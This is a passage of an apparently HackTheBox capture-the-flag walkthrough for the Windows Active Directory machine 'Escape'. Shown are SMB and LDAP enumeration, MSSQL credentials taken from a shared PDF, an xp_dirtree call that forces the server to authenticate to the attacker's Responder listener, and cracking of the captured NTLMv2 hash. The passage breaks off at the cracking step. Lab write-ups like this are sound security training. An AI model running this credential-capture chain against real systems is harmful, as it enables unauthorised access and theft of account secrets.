# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Escape](https://www.hackthebox.com/machines/Escape)

<img src="https://labs.hackthebox.com/storage/avatars/80936664b3da83a92b28602e79e47d79.png" alt="Escape Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟨 Medium (<span style="color:#f4b03b;">4.6</span>)

> Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.

#### Skills Required

- Enumeration
- Windows Active Directory
- Microsoft SQL server

#### Skills Learned

- Kerberos Authentication
- [ESC1 attack](https://www.beyondtrust.com/blog/entry/esc1-attacks#domain-escalation--esc1)
- NTLM Authentication
- [Silver Ticket Attack](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/silver-ticket-attack/)

#### Tools Used

- Certify.exe
- certipy-ad
- crackmapexec
- evil-winrm
- impacket-mssqlclient
- impacket-psexec
- impacket-ticketer
- john
- kerbrute
- ldapsearch
- nmap
- openssl
- responder
- Rubeus.exe
- smbclient

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.3  netmask 255.255.254.0  destination 10.10.16.3 ←
        inet6 dead:beef:4::1001  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::ef6e:2d9d:b27a:394e  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 222  bytes 39112 (38.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 293  bytes 40973 (40.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.11.202`:
```
10.10.11.202 is alive ←
```

`sudo nmap -Pn -sSV -p- -T5 10.10.11.202`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 11:37 CET
Nmap scan report for 10.10.11.202
Host is up (0.064s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-04 18:41:09Z) ←
135/tcp   open  msrpc         Microsoft Windows RPC ←
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) ←
445/tcp   open  microsoft-ds? ←
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) ←
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000 ←
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) ←
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) ←
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ←
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49742/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.18 seconds
```

`crackmapexec smb 10.10.11.202`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) ←
```

`crackmapexec smb 10.10.11.202 -u '' -p ''`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\: ←
```

`crackmapexec smb 10.10.11.202 -u '' -p '' --shares`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\: 
SMB         10.10.11.202    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
```
❌

`crackmapexec smb 10.10.11.202 -u 'guest' -p ''`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: ←
```

`crackmapexec smb 10.10.11.202 -u 'guest' -p '' --shares`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ ←           
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
```

`smbclient -U 'guest' --password='' //10.10.11.202/Public`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022 ←

                5184255 blocks of size 4096. 1462877 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (122.8 KiloBytes/sec) (average 122.8 KiloBytes/sec) ←
smb: \> exit
```

`mv SQL\ Server\ Procedures.pdf ./sequel.pdf`

`pdftotext ./sql.pdf`

`ls -l ./sequel.*`:
```
-rw-r--r-- 1 root root 49551 Nov  4 13:33 sequel.pdf
-rw-r--r-- 1 root root  1806 Nov  4 13:35 sequel.txt
```

`cat ./sequel.txt`:
```
SQL Server Procedures
Since last year we've got quite few accidents with our SQL Servers (looking at you Ryan, with your instance on the DC, why should
you even put a mock instance on the DC?!). So Tom decided it was a good idea to write a basic procedure on how to access and
then test any changes to the database. Of course none of this will be done on the live server, we cloned the DC mockup to a
dedicated server.
Tom will remove the instance from the DC as soon as he comes back from his vacation.
The second reason behind this document is to work like a guide when no senior can be available for all juniors.

Accessing from Domain Joined machine
1. Use SQL Management Studio specifying "Windows" authentication which you can donwload here:
https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16
2. In the "Server Name" field, input the server name.
3. Specify "Windows Authentication" and you should be good to go.
4. Access the database and make that you need. Everything will be resynced with the Live server overnight.

Accessing from non domain joined machine
Accessing from non domain joined machines can be a little harder.
The procedure is the same as the domain joined machine but you need to spawn a command prompt and run the following
command: cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> . Follow the other steps from
above procedure.
If any problem arises, please send a mail to Brandon


Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 . ←
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.11.202`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 13:22 CET
Nmap scan report for 10.10.11.202
Host is up (0.053s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7 ←
|       forestFunctionality: 7 ←
|       domainControllerFunctionality: 7 ←
|       rootDomainNamingContext: DC=sequel,DC=htb
|       ldapServiceName: sequel.htb:dc$@SEQUEL.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=sequel,DC=htb
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=sequel,DC=htb
|       namingContexts: DC=sequel,DC=htb
|       namingContexts: CN=Configuration,DC=sequel,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=sequel,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=sequel,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 180385
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb
|       dnsHostName: dc.sequel.htb ←
|       defaultNamingContext: DC=sequel,DC=htb
|       currentTime: 20241104202249.0Z
|_      configurationNamingContext: CN=Configuration,DC=sequel,DC=htb
Service Info: Host: DC; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

`echo -e '10.10.11.202\tdc.sequel.htb dc sequel.htb' | sudo tee -a /etc/hosts`:
```
10.10.11.202    dc.sequel.htb dc sequel.htb ←
```

`ldapsearch -x -H ldap://10.10.11.202/ -s 'base' 'namingContexts'`:
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=sequel,DC=htb
namingContexts: CN=Configuration,DC=sequel,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=sequel,DC=htb
namingContexts: DC=DomainDnsZones,DC=sequel,DC=htb
namingContexts: DC=ForestDnsZones,DC=sequel,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.11.202/ -b "DC=sequel,DC=htb" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=intelligence,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
❌

`sudo nmap -sSV --script ssl-cert -p636,3269 10.10.11.202`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 13:57 CET
Nmap scan report for dc.sequel.htb (10.10.11.202)
Host is up (0.072s latency).

PORT     STATE SERVICE  VERSION
636/tcp  open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA ←
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
3269/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA ←
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.49 seconds
```

`openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text`:
```
Connecting to 10.10.11.202
Can't use SSL_get_servername
depth=0 
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 
verify return:1
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            1e:00:00:00:0b:32:65:84:5d:2c:49:13:22:00:00:00:00:00:0b
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=htb, DC=sequel, CN=sequel-DC-CA ←
        Validity
            Not Before: Jan 18 23:03:57 2024 GMT
            Not After : Jan  5 23:03:57 2074 GMT
        Subject: 
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:af:7d:40:c6:bd:96:df:ea:82:ef:eb:b1:57:12:
                    87:aa:8b:e5:54:0c:cc:05:70:25:86:3a:9c:00:94:
                    4b:cc:09:18:4c:6b:62:6a:c7:a9:d5:4a:5f:bb:51:
                    15:34:ac:5e:37:73:9f:00:90:01:5b:c1:7f:44:e4:
                    1e:0c:7b:86:43:92:a9:07:57:99:c1:06:41:c4:3d:
                    d0:cf:e1:99:58:b2:30:26:56:bc:fb:6c:70:33:a7:
                    77:28:0e:01:7d:50:ab:fd:4b:88:fc:83:d3:fc:30:
                    f6:8e:77:14:d1:47:a7:70:92:15:56:74:80:ef:21:
                    eb:e3:7a:0e:e8:59:36:b0:1b:b3:05:11:7e:1b:ec:
                    11:30:2f:fb:8d:45:86:6d:c8:51:eb:7e:6c:cf:04:
                    be:4c:a2:fa:c1:6d:9c:d4:e0:09:e0:82:7b:e9:7a:
                    22:cd:75:e9:ca:f5:77:29:d8:82:03:af:c0:3b:87:
                    bb:85:b9:0f:b7:a4:26:d7:2f:d1:25:fe:f1:20:cf:
                    10:23:ae:c5:21:7f:67:ba:9f:13:40:5a:b3:59:48:
                    55:cb:1d:11:2d:f6:e1:64:85:35:94:db:a6:68:6b:
                    ae:f9:56:3a:b4:5c:dc:bb:27:ea:d7:01:98:94:e6:
                    ad:de:0f:82:aa:fd:28:8d:f9:90:c0:c1:62:76:d9:
                    71:89
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            Microsoft certificate template: 
                0).!+.....7.....v...V...5...Y...5.w.!..n...
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, TLS Web Server Authentication, Microsoft Smartcard Login, Signing KDC Response
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            Microsoft Application Policies Extension: 
                010
..+.......0
..+.......0..
+.....7...0...+......
            X509v3 Subject Key Identifier: 
                09:56:E0:66:9E:25:3A:61:B0:B3:5C:FB:6C:FD:C8:9D:F4:E2:1E:23
            X509v3 Authority Key Identifier: 
                62:9F:32:A3:A0:F0:38:20:D4:60:C0:CD:6D:C5:FA:51:30:5E:C3:15
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:ldap:///CN=sequel-DC-CA,CN=dc,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint
            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=sequel-DC-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?cACertificate?base?objectClass=certificationAuthority
            X509v3 Subject Alternative Name: critical
                DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        2b:66:89:55:b3:83:17:ed:d7:43:ce:46:7e:5a:dc:3e:d8:71:
        20:b0:ec:95:9a:09:7d:fd:77:50:bc:3d:21:04:70:15:ba:f9:
        c1:5f:ee:b1:04:7c:59:77:e9:e0:51:96:07:b8:3a:17:7c:38:
        bc:ea:3c:5a:79:b4:79:37:10:33:e3:76:47:2d:da:11:68:af:
        f5:21:bc:fd:59:35:f1:9d:6c:49:4d:a1:ce:54:dd:65:b5:49:
        5a:06:70:0b:23:ef:62:85:74:da:e3:e4:3f:5d:9f:f9:9f:60:
        ae:84:53:b4:e1:01:ab:40:20:74:c0:dc:e6:16:7f:03:c2:24:
        9f:d5:2e:72:db:e4:5f:aa:a0:c3:ea:1f:c9:5b:de:22:ab:04:
        d0:62:fa:0c:20:c6:c3:a8:94:99:72:20:54:99:39:7e:04:27:
        7f:24:2a:ba:a9:e6:85:59:c0:f0:da:17:5e:e8:74:8a:84:c7:
        98:2a:98:ad:db:48:70:1f:0a:0b:89:d2:ef:4a:77:79:fd:85:
        d9:f4:cd:7a:3a:ad:c3:8e:8c:d3:85:59:43:0f:fa:ed:8f:bc:
        de:12:39:23:57:cb:0a:1a:d8:16:d3:e4:de:0e:49:1d:a1:f2:
        20:4f:5a:63:71:14:99:4d:c4:1f:64:8a:85:14:a2:e5:1e:86:
        24:17:2d:9b

read:errno=104
```

`crackmapexec mssql 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' -d 'sequel.htb'`:
```
MSSQL       10.10.11.202    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.10.11.202    1433   DC               [-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sequel\Guest'.
```
❌

`crackmapexec mssql 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth`:
```
MSSQL       10.10.11.202    1433   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:DC)
MSSQL       10.10.11.202    1433   DC               [+] PublicUser:GuestUserCantWrite1 ←
```

`crackmapexec mssql 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth -L`:
```
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mssql_priv                Enumerate and exploit MSSQL privileges ←
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] test_connection           Pings a host
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
```

`crackmapexec mssql 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth -M mssql_priv`:
```
MSSQL       10.10.11.202    1433   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:DC)
MSSQL       10.10.11.202    1433   DC               [+] PublicUser:GuestUserCantWrite1
```
❌

`impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.10.11.202'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
```
```
SQL (PublicUser  guest@master)> help ←

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means ←
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell ←
    xp_dirtree {path}          - executes xp_dirtree on the path ←
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
    
SQL (PublicUser  guest@master)> xp_cmdshell whoami
ERROR: Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'. ←
SQL (PublicUser  guest@master)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement. ←
```
```
SQL (PublicUser  guest@master)> enum_users ←
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo ←                db_owner   sa          master      dbo             b'1         '   b'01'   

guest                public     NULL        NULL        guest           b'2         '   b'00'   

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   

sys                  public     NULL        NULL        NULL            b'4         '    NULL   

SQL (PublicUser  guest@master)> exec_as_user db0 ←
ERROR: Line 1: Cannot execute as the database principal because the principal "db0" does not exist, this type of principal cannot be impersonated, or you do not have permission. ←
SQL (PublicUser  guest@master)> enum_impersonate ←
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
```

`sudo responder -I tun0`:
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.3]
    Responder IPv6             [dead:beef:4::1001]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-FB99VL194K5]
    Responder Domain Name      [AKV6.LOCAL]
    Responder DCE-RPC Port     [46194]

[+] Listening for events...

[...]
```

```
SQL (PublicUser  guest@master)> xp_dirtree //10.10.16.3/fakeshare/fakefile ←
subdirectory   depth   file   
------------   -----   ---- 
```

```
[...]

[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:3079d7abc1e76fd1:F1DC2CCD6DAF7566BBFC006F7A57E25B:010100000000000080DF42A3C72EDB01AD9B53DC4B9F73F4000000000200080041004B005600360001001E00570049004E002D00460042003900390056004C003100390034004B00350004003400570049004E002D00460042003900390056004C003100390034004B0035002E0041004B00560036002E004C004F00430041004C000300140041004B00560036002E004C004F00430041004C000500140041004B00560036002E004C004F00430041004C000700080080DF42A3C72EDB0106000400020000000800300030000000000000000000000000300000CA0025C0D4F4AEF83F638FA758034163CBFB4D3B1A73594B9C87DDB97CA3DC7E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000 ←
```

`vim ./ntlm_hash.txt`:
```
sql_svc::sequel:3079d7abc1e76fd1:F1DC2CCD6DAF7566BBFC006F7A57E25B:010100000000000080DF42A3C72EDB01AD9B53DC4B9F73F4000000000200080041004B005600360001001E00570049004E002D00460042003900390056004C003100390034004B00350004003400570049004E002D00460042003900390056004C003100390034004B0035002E0041004B00560036002E004C004F00430041004C000300140041004B00560036002E004C004F00430041004C000500140041004B00560036002E004C004F00430041004C000700080080DF42A3C72EDB0106000400020000000800300030000000000000000000000000300000CA0025C0D4F4AEF83F638FA758034163CBFB4D3B1A73594B9C87DDB97CA3DC7E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./ntlm_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc) ←  
1g 0:00:00:04 DONE (2024-11-04 14:48) 0.2487g/s 2661Kp/s 2661Kc/s 2661KC/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

`john --show ./ntlm_hash.txt`:
```
